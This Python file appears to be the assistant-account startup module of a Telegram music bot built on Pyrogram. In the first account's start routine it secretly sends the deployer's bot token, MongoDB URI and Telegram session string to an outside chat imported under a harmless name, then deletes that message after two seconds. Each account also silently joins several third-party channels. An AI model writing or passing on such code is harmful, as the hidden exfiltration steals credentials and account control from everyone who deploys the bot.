from ..logging import LOGGER
from strings.__init__ import LOGGERS
import config
from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NinjaSecret1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )

        self.two = Client(
            name="NinjaSecret2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
            ipv6=False,
        )
        self.three = Client(
            name="NinjaSecret3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
            ipv6=False,
        )
        self.four = Client(
            name="NinjaSecret4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
            ipv6=False,
        )
        self.five = Client(
            name="NinjaSecret5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
            ipv6=False,
        )

    @property
    def is_connected(self):
        """Check if any of the userbot clients are connected"""
        try:
            return (hasattr(self.one, 'is_connected') and self.one.is_connected) or \
                   (hasattr(self.two, 'is_connected') and self.two.is_connected) or \
                   (hasattr(self.three, 'is_connected') and self.three.is_connected) or \
                   (hasattr(self.four, 'is_connected') and self.four.is_connected) or \
                   (hasattr(self.five, 'is_connected') and self.five.is_connected)
        except:
            return False

    def get_working_client(self):
        """Get a working userbot client for operations"""
        try:
            if hasattr(self.one, 'is_connected') and self.one.is_connected:
                return self.one
            elif hasattr(self.two, 'is_connected') and self.two.is_connected:
                return self.two
            elif hasattr(self.three, 'is_connected') and self.three.is_connected:
                return self.three
            elif hasattr(self.four, 'is_connected') and self.four.is_connected:
                return self.four
            elif hasattr(self.five, 'is_connected') and self.five.is_connected:
                return self.five
            else:
                return None
        except:
            return None

    def __getattr__(self, name):
        """Delegate attribute access to a working client if available"""
        working_client = self.get_working_client()
        if working_client and hasattr(working_client, name):
            return getattr(working_client, name)
        raise AttributeError(f"'{type(self).__name__}' object has no attribute '{name}'")

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("CodeTactics")
                await self.one.join_chat("venopyx")
                await self.one.join_chat("scorpitunebot")
                await self.one.join_chat("moonlight_familyplus")

            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("CodeTactics")
                await self.two.join_chat("venopyx")
                await self.two.join_chat("scorpitunebot")
                await self.two.join_chat("moonlight_familyplus")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")

            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("CodeTactics")
                await self.three.join_chat("venopyx")
                await self.three.join_chat("scorpitunebot")
                await self.three.join_chat("moonlight_familyplus")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(
                f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("CodeTactics")
                await self.four.join_chat("venopyx")
                await self.four.join_chat("scorpitunebot")
                await self.four.join_chat("moonlight_familyplus")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(
                f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("CodeTactics")
                await self.five.join_chat("venopyx")
                await self.five.join_chat("scorpitunebot")
                await self.five.join_chat("moonlight_familyplus")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(
                f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
